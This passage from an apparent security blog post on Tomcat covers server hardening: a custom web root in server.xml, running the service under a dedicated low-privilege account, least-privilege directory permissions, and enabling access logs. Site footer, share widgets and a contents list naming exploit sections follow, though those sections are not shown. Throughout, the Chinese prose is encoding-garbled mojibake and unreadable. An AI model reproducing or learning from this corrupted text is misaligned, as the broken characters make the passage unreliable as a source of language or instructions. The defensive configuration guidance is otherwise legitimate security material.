class="line">ã€€ã€€redirectPort&#x3D;&quot;8443&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>3.Tomcatç‰ˆæœ¬çš„é€‰æ‹©ä¸å®‰è£…æ³¨æ„äº‹é¡¹<br>åœ¨å®‰è£…æ—¶ä½¿ç”¨è‡ªå®šä¹‰çš„å®‰è£…è·¯å¾„ï¼Œå¹¶è‡ªå®šä¹‰WEBæ ¹ç›®å½•ã€‚å¯ä»¥åœ¨Tomcatå®‰è£…ç›®å½•çš„confç›®å½•ä¸‹çš„server.xmlä¸­ä¿®æ”¹é»˜è®¤WEBæ ¹ç›®å½•<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åœ¨&lt;/Host&gt;ä¹‹å‰åŠ å…¥ç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼šï¼ˆé‡å¯ç”Ÿæ•ˆï¼‰</span></span><br><span class="line">&lt;Context path=<span class="string">""</span> docBase=<span class="string">"D:/javaweb"</span> debug=<span class="string">"0"</span> reloadable=<span class="string">"true"</span> crossContext=<span class="string">"true"</span> /&gt;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢è¯­å¥çš„ä½œç”¨æ˜¯è®¾ç½®Tomcatè™šæ‹Ÿè·¯å¾„ï¼Œpathä»£è¡¨è™šæ‹Ÿç›®å½•ï¼Œå¯è‡ªå®šä¹‰ï¼Œä¹Ÿå¯ä»¥ä¸ºç©ºï¼ŒdocBaseä»£è¡¨ç‰©ç†è·¯å¾„<br>å¦‚æœæŒ‰ä¸Šé¢çš„è®¾ç½®ï¼Œå½“è®¿é—®<a href="http://192.168.30.128:8080æ—¶å®é™…è®¿é—®çš„æ˜¯D:\javawebç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚">http://192.168.30.128:8080æ—¶å®é™…è®¿é—®çš„æ˜¯D:\javawebç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</a><br>å¦‚æœpathçš„å€¼ä¸ä¸ºç©ºï¼Œå¦‚è®¾ç½®ä¸ºpath=â€javaâ€æ—¶ï¼Œé‚£ä¹ˆè®¿é—®æ—¶åº”è¯¥è¿™æ ·ï¼š<a href="http://192.168.30.128:8080/javaã€‚" target="_blank" rel="noopener">http://192.168.30.128:8080/javaã€‚</a></p>
<p><br></p>
<p>4.Tomcaté™æƒ<br>åœ¨Windowsç¯å¢ƒä¸‹ï¼ŒTomcaté»˜è®¤ä»¥Systemæƒé™è¿è¡Œï¼ˆå¦‚å›¾11ï¼‰ï¼Œè¿™æ ·çš„åæœæ˜¯ä¸€æ—¦æˆåŠŸå…¥ä¾µWEBåº”ç”¨ï¼Œå°†ç›´æ¥å¾—åˆ°ä¸€ä¸ªé«˜æƒé™çš„Webshellï¼Œå¹¶ä¸”ä¸éœ€è¦ææƒæ“ä½œå°±å¯ä»¥å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚<br>é¦–å…ˆæ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼Œè®¾ç½®å¤æ‚çš„å¯†ç ï¼Œå¹¶ä¸”è®©å®ƒä¸å±äºä»»ä½•ç”¨æˆ·ç»„ï¼š<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112116.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112116.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>æ¥ç€æ‰“å¼€â€œæœ¬åœ°å®‰å…¨ç­–ç•¥â€â€”&gt;â€œæœ¬åœ°ç­–ç•¥â€â€”&gt;â€œç”¨æˆ·æƒé™åˆ†é…â€ï¼Œæ‰¾åˆ°â€œä½œä¸ºæœåŠ¡ç™»å½•â€é¡¹ï¼ŒæŠŠåˆšåˆšæ–°å»ºçš„ç”¨æˆ·æ·»åŠ è¿›å»ï¼Œå¦‚å›¾13ã€‚<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112126.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112126.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>ç„¶åæ‰“å¼€â€œæœåŠ¡â€ç»„ä»¶ï¼Œæ‰¾åˆ°Tomcatçš„æœåŠ¡ï¼Œå³é”®â€œå±æ€§â€â€”&gt;â€œç™»å½•â€ï¼Œç”¨åˆšæ–°å»ºçš„tomcatè´¦å·è¿è¡ŒTomcatæœåŠ¡ï¼Œå¦‚å›¾14<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112134.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112134.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>å†æ‰¾åˆ°Tomcatå®‰è£…ç›®å½•ï¼Œåªä¸ºâ€œAdministratorsç»„â€å’Œâ€œtomcatâ€è´¦æˆ·åˆ†é…å®Œå…¨æ§åˆ¶æƒé™ï¼Œå¹¶å°†å…¶ä»–è´¦æˆ·æƒé™å…¨éƒ¨åˆ é™¤ã€‚<br>å¦‚æœä¸ä¸ºtomcatè´¦æˆ·åˆ†é…æƒé™ï¼ŒTomcatæœåŠ¡å°†æ— æ³•å¯åŠ¨ï¼Œç„¶åéœ€è¦ä»¥æœ€å°æƒé™åŸåˆ™ä¸ºTomcatæ—¥å¿—ç›®å½•å’ŒWEBç›®å½•å•ç‹¬åˆ†é…æƒé™ï¼Œæ—¥å¿—ç›®å½•åªéœ€è¦åˆ†é…â€œè¯»å–â€å’Œâ€œå†™å…¥â€æƒé™å³å¯ã€‚<br>ç½‘ç«™ä¸Šä¼ ç›®å½•å’Œæ•°æ®åº“ç›®å½•ä¸€èˆ¬éœ€è¦åˆ†é…â€œå†™å…¥â€æƒé™ï¼Œä½†ä¸€å®šä¸è¦åˆ†é…æ‰§è¡Œæƒé™ï¼Œå…¶ä»–ç›®å½•ä¸€èˆ¬åªåˆ†é…â€œè¯»å–â€æƒé™å³å¯ï¼›<br>æ³¨ï¼šWEBç›®å½•æƒé™åˆ†é…å¯ä¾æ®ä»¥ä¸‹åŸåˆ™ï¼šæœ‰å†™å…¥æƒé™ï¼Œä¸€å®šä¸è¦åˆ†é…æ‰§è¡Œæƒé™ï¼›æœ‰æ‰§è¡Œæƒé™ï¼Œä¸€å®šä¸è¦åˆ†é…å†™å…¥æƒé™ã€‚<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112147.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112147.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><br></p>
<p>5.Tomcatæ—¥å¿—å®‰å…¨é…ç½®<br>åœ¨Tomcatä¸Šä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå®ƒçš„æ—¥å¿—é»˜è®¤ä¿å­˜åœ¨Tomcatå®‰è£…ç›®å½•çš„logsç›®å½•ä¸‹ï¼Œè¦æ³¨æ„çš„æ˜¯Tomcaté»˜è®¤å¹¶æ²¡æœ‰å¼€å¯è®¿é—®æ—¥å¿—ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹å·¥å¼€å¯å®ƒã€‚<br>æ‰“å¼€server.xml<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112208.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112208.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>ç„¶åä¿®æ”¹æ—¥å¿—çš„é»˜è®¤ä¿å­˜è·¯å¾„ï¼Œå¹¶è®¾ç½®åªå…è®¸ç³»ç»Ÿç®¡ç†å‘˜æœ‰æ—¥å¿—ä¿å­˜ç›®å½•çš„å®Œå…¨æ§åˆ¶æƒé™ï¼Œtomcatè´¦æˆ·æœ‰â€œè¯»å–â€å’Œâ€œå†™å…¥â€æƒé™å³å¯ï¼Œæ‰€ç¤º<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112219.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112219.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>

        </div>
        <!-- Google å¹¿å‘Š -->
        
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-9134434519967436" data-ad-slot="7905848205"></ins>
  

        
<hr/>
<div style="text-align: center;font-weight: bold;">
  <p> æ¬¢è¿å„ä½å¿—åŒé“åˆçš„æœ‹å‹ä¸€èµ·å­¦ä¹ äº¤æµï¼Œå¦‚æ–‡ç« æœ‰è¯¯è¯·åœ¨ä¸‹æ–¹ç•™ä¸‹æ‚¨å®è´µçš„ç»éªŒçŸ¥è¯†ï¼Œä¸ªäººé‚®ç®±åœ°å€<b style="color:#ff654e"><code>ã€master#weiyigeek.topã€‘</code></b>æˆ–è€…ä¸ªäººå…¬ä¼—å·<b style="color:#ff654e"><code>ã€WeiyiGeekã€‘</code></b>è”ç³»æˆ‘ã€‚ </p>
  <p> æ›´å¤šæ–‡ç« æ¥æºäº<b style="color:#03a9f4">ã€WeiyiGeek Blog - ä¸ºäº†èƒ½åˆ°è¿œæ–¹ï¼Œè„šä¸‹çš„æ¯ä¸€æ­¥éƒ½ä¸èƒ½å°‘ã€‘</b>, ä¸ªäººé¦–é¡µåœ°å€( <a style="color: #03a9f4;" href="https://weiyigeek.top" target="_blank"> https://weiyigeek.top </a> )</p>
<!-- 

  <ul style="font-weight: bolder;">
    <li>
      <p><span style="color: #03a9f4">echo&nbsp;&nbsp;"ã€ç‚¹ä¸ªèµã€‘ï¼ŒåŠ¨åŠ¨ä½ é‚£ç²—å£®çš„æ‹‡æŒ‡æˆ–è€…èŠŠèŠŠç‰æ‰‹ï¼Œäº²ï¼"</span></p>
    </li>
    <li>
      <p><span style="color: #ff9201">printf("%s",&nbsp;"ã€æŠ•ä¸ªå¸ã€‘ï¼Œä¸‡æ°´åƒå±±æ€»æ˜¯æƒ…ï¼ŒæŠ•ä¸ªç¡¬å¸è¡Œä¸è¡Œï¼Œäº²ï¼")</span></p>
    </li>
    <li>
      <p><span style="color: #02a2ff">fmt.Printf("ã€æ”¶ä¸ªè—ã€‘ï¼Œé˜…åå³ç„šä¸åƒç°ï¼Œäº²ï¼")&nbsp;&nbsp;</span></p>
    </li>
    <li>
      <p><span style="color:red">console.info("ã€è½¬ä¸ªå‘ã€‘ï¼Œè®©æ›´å¤šçš„å¿—åŒé“åˆçš„æœ‹å‹ä¸€èµ·å­¦ä¹ äº¤æµï¼Œäº²ï¼")</span></p>
    </li>
    <li>
      <p><span style="color: #ff654e">System.out.println("ã€å…³ä¸ªæ³¨ã€‘ï¼Œåç»­æµè§ˆæŸ¥çœ‹ä¸è¿·è·¯å“Ÿï¼Œäº²ï¼")</span></p>
    </li>
  </ul> -->
  <div>
    <img src="/img/share-wechat.jpg" class="img-responsive" alt="æ‰«æFollow(å…³æ³¨)WeiyiGeekå…¬ä¼—å·ä¸Visit(æµè§ˆ)æå®¢å…¨æ ˆä¿®ç‚¼å°ç¨‹åº" >
    <p>ä¸“æ ä¹¦å†™ä¸æ˜“ï¼Œå¦‚æœæ‚¨è§‰å¾—è¿™ä¸ªä¸“æ è¿˜ä¸é”™çš„ï¼Œè¯·ç»™è¿™ç¯‡ä¸“æ  <b style="color: red;">ã€ç‚¹ä¸ªèµã€æŠ•ä¸ªå¸ã€æ”¶ä¸ªè—ã€å…³ä¸ªæ³¨ã€è½¬ä¸ªå‘ã€èµä¸ªåŠ©ã€‘</b>ï¼Œè¿™å°†å¯¹æˆ‘çš„è‚¯å®šï¼Œæˆ‘å°†æŒç»­æ•´ç†å‘å¸ƒæ›´å¤šä¼˜è´¨åŸåˆ›æ–‡ç« ï¼ã€‚</p>
    <img src="/img/weiyigeek.jpg" class="img-responsive" alt="WeiyiGeek-banner">
  </div>
</div>
  <hr>
  

  <blockquote class="post-copyright">
    <div class="content">
      
        
<span class="post-time">
    æœ€åæ›´æ–°æ—¶é—´ï¼š<time datetime="2023-01-31T02:29:10.673Z" itemprop="dateUpdated">2023-01-31 10:29:10</time>
</span><br>


        <span>æ–‡ç« åŸå§‹è·¯å¾„ï¼š<a href="https://github.com/WeiyiGeek/blog/edit/master/source/_posts/ç½‘å®‰å¤§ç±»/Vulnerable/Web/Tomcatè„†å¼±æ€§ä¸€è§ˆè¡¨.md" target="_blank" rel="noopener noreferrer">_posts/ç½‘å®‰å¤§ç±»/Vulnerable/Web/Tomcatè„†å¼±æ€§ä¸€è§ˆè¡¨.md</a></span><br>
         <span class="copy-copyright">è½¬è½½æ³¨æ˜å‡ºå¤„ï¼ŒåŸæ–‡åœ°å€ï¼š<a href="/2019/9-9-418.html" target="_blank" rel="external">https://blog.weiyigeek.top/2019/9-9-418.html</a></span><br>æœ¬ç«™æ–‡ç« å†…å®¹éµå¾ª <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">çŸ¥è¯†å…±äº« ç½²å - éå•†ä¸šæ€§ - ç›¸åŒæ–¹å¼å…±äº« 4.0 å›½é™…åè®®</a> 
    </div>
    <footer>
      <a href="https://blog.weiyigeek.top">
        <img src="/img/avatar.jpg" alt="WeiyiGeek">
        WeiyiGeek
      </a>
    </footer>
  </blockquote>


        
            <div class="page-reward">
  <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-rectangle waves-light">â˜•ï¸ è¯·ä½œè€…å–æ¯å’–å•¡!</a>
</div>
            
        
        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Tomcat/" rel="tag">Tomcat</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.weiyigeek.top/2019/9-9-418.html&title=ã€ŠTomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ã€‹ â€” WeiyiGeek Blog&pic=https://blog.weiyigeek.top/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.weiyigeek.top/2019/9-9-418.html&title=ã€ŠTomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ã€‹ â€” WeiyiGeek Blog&source=æ³¨æ„ï¼šæœ¬æ–‡åˆ†äº«ç»™å®‰å…¨ä»ä¸šäººå‘˜ã€ç½‘ç«™å¼€å‘äººå‘˜ä»¥åŠè¿ç»´äººå‘˜åœ¨æ—¥å¸¸å·¥ä½œé˜²èŒƒæ¶æ„æ”»å‡»,è¯·å‹¿æ¶æ„ä½¿ç”¨ä¸‹é¢ä»‹ç»æŠ€æœ¯è¿›è¡Œéæ³•æ”»å‡»æ“ä½œã€‚ã€‚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.weiyigeek.top/2019/9-9-418.html" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠTomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ã€‹ â€” WeiyiGeek Blog&url=https://blog.weiyigeek.top/2019/9-9-418.html&via=https://blog.weiyigeek.top" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://blog.weiyigeek.top/2019/9-9-418.html" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
          <!-- è¯„è®ºç»„ä»¶ -->


<div id="gitalk-container"></div>
<script type="text/javascript" src="/js/plugins/gitalk.min.js?v=1.6.6"></script>
<script type="text/javascript" src="/js/custom/gitalk.init.js?v=1.6.6"></script>
        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2019/9-9-417.html" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Apacheè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2019/9-8-372.html" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Nanoç¼–è¾‘å™¨çš„åŸºç¡€ä½¿ç”¨</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>ç›®å½•</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-å‰è¨€ç®€è¿°"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 å‰è¨€ç®€è¿°</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x02 æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-Tomcatåå°å¼±å£ä»¤ä¸Šä¼ waråŒ…"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">1.Tomcatåå°å¼±å£ä»¤ä¸Šä¼ waråŒ…</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x03 æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x01-Manager-administratorç®¡ç†é¡µé¢ç™»å½•"><span class="post-toc-number">3.0.1.</span> <span class="post-toc-text">0x01 Manager administratorç®¡ç†é¡µé¢ç™»å½•</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x02-Tomcat-Manager-XSSæ¼æ´"><span class="post-toc-number">3.0.2.</span> <span class="post-toc-text">0x02 Tomcat Manager XSSæ¼æ´</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x03-Tomcatæ ·ä¾‹ç›®å½•sessionæ“çºµæ¼æ´"><span class="post-toc-number">3.0.3.</span> <span class="post-toc-text">0x03 Tomcatæ ·ä¾‹ç›®å½•sessionæ“çºµæ¼æ´</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x04-Tomcatæ ·ä¾‹ç›®å½•XXSæ¼æ´"><span class="post-toc-number">3.0.4.</span> <span class="post-toc-text">0x04 Tomcatæ ·ä¾‹ç›®å½•XXSæ¼æ´</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x05-Tomcat-JMXæœåŠ¡å™¨å¼±å£ä»¤"><span class="post-toc-number">3.0.5.</span> <span class="post-toc-text">0x05 Tomcat JMXæœåŠ¡å™¨å¼±å£ä»¤</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x06-CVE-2016-8735-è¿œç¨‹ä»£ç æ‰§è¡Œ"><span class="post-toc-number">3.0.6.</span> <span class="post-toc-text">0x06 CVE-2016-8735(è¿œç¨‹ä»£ç æ‰§è¡Œ)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x07-CVE-2019-0232-è¿œç¨‹ä»£ç æ‰§è¡Œ"><span class="post-toc-number">3.0.7.</span> <span class="post-toc-text">0x07 CVE-2019-0232(è¿œç¨‹ä»£ç æ‰§è¡Œ)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x08-CVE-2018-1305-æƒé™ç»•è¿‡"><span class="post-toc-number">3.0.8.</span> <span class="post-toc-text">0x08 CVE-2018-1305(æƒé™ç»•è¿‡)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x09-CVE-2017-12615-æ–‡ä»¶PUTä¸Šä¼ "><span class="post-toc-number">3.0.9.</span> <span class="post-toc-text">0x09 CVE-2017-12615(æ–‡ä»¶PUTä¸Šä¼ )</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x10-CVE-2017-5664-æ–‡ä»¶PUTä¸Šä¼ "><span class="post-toc-number">3.0.10.</span> <span class="post-toc-text">0x10 CVE-2017-5664(æ–‡ä»¶PUTä¸Šä¼ )</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#é™„å½•"><span class="post-toc-number">3.0.11.</span> <span class="post-toc-text">é™„å½•</span></a></li></ol></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    


    <!-- æ”¯ä»˜å®å¾®ä¿¡æ–‡ç« èµèµ -->
    
      <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        å¦‚æœæ­¤ç¯‡æ–‡ç« å¯¹æ‚¨æœ‰å¸®åŠ©ï¼Œå°±è¯·ä½œè€…å–æ¯ Coffee â˜•ï¸â˜•ï¸!
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardwechat" src="/img/reward-wechat.jpg" height="250" height="250" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
            <img id="rewardalipay" src="/img/reward-alipay.png" height="250" height="250" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
        </div>
        
        <label class="reward-toggle">
            <!-- <input id="rewardToggle" type="checkbox" class="reward-toggle-check" data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.png"> -->
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">å¾®ä¿¡</span>
                <span class="reward-toggle-item alipay">æ”¯ä»˜å®</span>
            </div>
        </label>
        
    </div>
</div>

      

    <!-- å¾®ä¿¡å…¬ä¼—å·å…³æ³¨/æ–‡ç« ç‰ˆæƒå¤åˆ¶ -->
    
      <div id="btw-mask" style="position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; opacity: 0.7; z-index: 999; background: rgb(0, 0, 0); display:none"></div>
<div id="btw-modal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 360px; text-align: center; font-size: 13px; background: rgb(255, 255, 255); border-radius: 10px; z-index: 9999; font-family: PingFangSC-Regular, sans-serif;display:none">
<span id="btw-modal-close-btn" style="position: absolute; top: 5px; right: 15px; line-height: 1.8; font-size: 15px; cursor: pointer; opacity: 0.2; z-index: 9999; color: rgb(0, 0, 0); background: none; border: none; outline: none;">X</span>
<p id="btw-modal-header" style="margin-top: 40px; line-height: 1.8; font-size: 13px; ">
<b style="color:#6190e8;">ä½ å¥½çœ‹å‹,æ¬¢è¿å…³æ³¨åšä¸»å¾®ä¿¡å…¬ä¼—å·å“Ÿ! â¤ <br> è¿™å°†æ˜¯æˆ‘æŒç»­æ›´æ–°æ–‡ç« çš„åŠ¨åŠ›æºæ³‰ï¼Œè°¢è°¢æ”¯æŒï¼(à¹‘â€²á´—â€µà¹‘) </b> <br> å¦‚ä¸æƒ³å…³æ³¨è¯·ç‚¹å‡»å³ä¸Šè§’çš„ã€Xã€‘å³å¯å…³é—­ç»§ç»­æµè§ˆæ–‡ç« .<br>  <b style="color:red;"> æ¸©é¦¨æç¤º: æœªè§£é”çš„ç”¨æˆ·ä¸èƒ½ç²˜è´´å¤åˆ¶æ–‡ç« å†…å®¹å“Ÿ!</b> <br>
<br>Method 1.Please visit <strong><a href="https://twitter.com/WeiyiGeek" target="_blank" rel="noopener" style="color: rgb(240, 65, 52);text-decoration:underline;">ã€My Twitterã€‘</a></strong>. There is an article verification code in the homepage.
<br>æ–¹å¼2.è¯·è®¿é—®æœ¬åšä¸»çš„Bç«™<strong><a href="https://space.bilibili.com/385802642" target="_blank" rel="noopener" style="color: rgb(240, 65, 52);text-decoration:underline;">ã€WeiyiGeekã€‘</a></strong>é¦–é¡µå…³æ³¨UPä¸»,<br>å°†è‡ªåŠ¨éšæœºè·å–è§£é”éªŒè¯ç ã€‚
<br>æ–¹å¼3.æ‰«ä¸€æ‰«ä¸‹æ–¹äºŒç»´ç ï¼Œå…³æ³¨æœ¬ç«™<strong>å®˜æ–¹å…¬ä¼—å·</strong><br>
å›å¤ï¼š<strong style="color: rgb(240, 65, 52);">éªŒè¯ç </strong>
å°†è·å–<strong style="color: rgb(240, 65, 52);">è§£é”(æœ‰æ•ˆæœŸ7å¤©)</strong>æœ¬ç«™æ‰€æœ‰æŠ€æœ¯æ–‡ç« å“Ÿ!</p>
<img src="/img/wechat-search.png" style="width: 300px; margin-top: 10px;">
<div id="btw-modal-input-code" style="margin-top: 20px; background: rgb(255, 255, 255);">
  <input id="btw-modal-input" type="number" minlength="4" maxlength="4" placeholder="è¯·è¾“å…¥éªŒè¯ç |Verification Code"
    style="width: 165px; height: 32px; line-height: 32px; padding: 0px 10px; margin: 0px 10px; font-size: 13px; text-rendering: auto; text-transform: none; cursor: text; outline: none; box-sizing: border-box; border: 1px solid rgb(221, 221, 221); -webkit-appearance: textfield; background-color: white; -webkit-rtl-ordering: logical;"/>
  <button id="btw-submit-btn" onclick="yzm_vertify()"
    style="padding: 0px 20px; height: 32px; font-size: 14px; outline: none; border: none; color: rgb(255, 255, 255); background: rgb(222, 104, 109); cursor: pointer;">æ
    äº¤</button> </div>
<p id="btw-footer" style="margin: 40px 0px 20px; color: rgb(153, 153, 153);">@WeiyiGeek - ä¸ºäº†èƒ½åˆ°è¿œæ–¹ï¼Œè„šä¸‹çš„æ¯ä¸€æ­¥éƒ½ä¸èƒ½å°‘</p>
</div>
        
</article>
</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Linksï¼š</span>
    
    <span class="blogroll-item">
        <a href="https://weiyigeek.top" target="_blank">https://weiyigeek.top</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://blog.weiyigeek.top" target="_blank">https://blog.weiyigeek.top</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://weiyigeek.top/img/search-wechat.jpg" target="_blank">å…¬ä¼—è´¦å·</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://space.bilibili.com/385802642/article" target="_blank">å“”å“©å“”å“©ä¸“æ </a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://github.com/weiyigeek" target="_blank">åšä¸»Github</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://gitee.com/WeiyiGeek" target="_blank">åšä¸»Gitee</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.zhihu.com/people/weiyiSec" target="_blank">çŸ¥ä¹</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.cnblogs.com/WeiyiGeek" target="_blank">åšå®¢å›­</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://my.oschina.net/weiyigeek" target="_blank">OSCHINA</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.toutiao.com/c/user/token/MS4wLjABAAAAqcPSoMqfctaEqJpGSF775eeCjWkrop4AOyLITdMx-L78F5iXzfQcSRM5sY4dq3wR" target="_blank">ä»Šæ—¥å¤´æ¡</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://blog.csdn.net/u013072756?type=lately" target="_blank">CSDN</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.jianshu.com/u/5199a1104739" target="_blank">ç®€ä¹¦</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://cloud.tencent.com/developer/user/1389665/articles" target="_blank">è…¾è®¯äº‘ç¤¾åŒº</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://cuttlefish.baidu.com/shop/75c5dbd8d15abe23482f4d40" target="_blank">ç™¾åº¦æ–‡åº“</a>
    </span>
    
    <span class="blogroll-item">
